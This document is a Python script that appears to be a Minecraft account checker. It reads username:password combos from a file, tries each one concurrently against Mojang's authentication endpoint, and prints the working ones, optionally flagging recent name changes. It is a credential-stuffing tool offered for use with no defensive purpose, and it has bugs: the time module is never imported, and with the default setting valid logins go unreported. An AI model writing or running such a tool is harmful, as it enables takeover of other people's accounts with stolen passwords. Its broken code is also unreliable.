import aiohttp
import asyncio
import json

combos = open("accounts.txt").read().splitlines()

#CHANGE TO TRUE IF YOU WANT TO CHECK IF ACCOUNT HAS CHANGED NAME IN LAST 30 DAYS
check_for_nc = False

async def login(id, combo):
	global check_for_nc
	split = combo.split(":")
	username = split[0]
	password = split[1]
	async with aiohttp.ClientSession() as session:
		resp = await session.post("https://authserver.mojang.com/authenticate", json={ 'agent' : {"name" : "Minecraft", "version" : 1}, 'username': username, 'password': password})
		jText = await resp.text()
		if "Invalid credentials. Invalid username or password" in jText:
			print(f'{username} failed to login!')
			return
		jLoaded = json.loads(jText)
		uuid = jLoaded['selectedProfile']['id']
		uname = jLoaded['selectedProfile']['name']
		if check_for_nc:
			resp = await session.get(f"https://api.mojang.com/user/profiles/{uuid}/names")
			r2 = await resp.json()
			for d in r2:
				if d['name'].lower() == uname.lower():
					if 'changedToAt' in d and int(d['changedToAt']) > ((time.time() * 1000) - 2592000000):
						print(f'{uname}:{username}:{password} :: NAME CHANGED WITHIN LAST 30 DAYS')
					else:
						print(f'{uname}:{username}:{password}')


async def main():
	global combos
	tasks=[]
	for i in range(len(combos)):
		tasks.append(asyncio.ensure_future(login(i, combos[i])))
	await asyncio.wait(tasks)

asyncio.run(main())
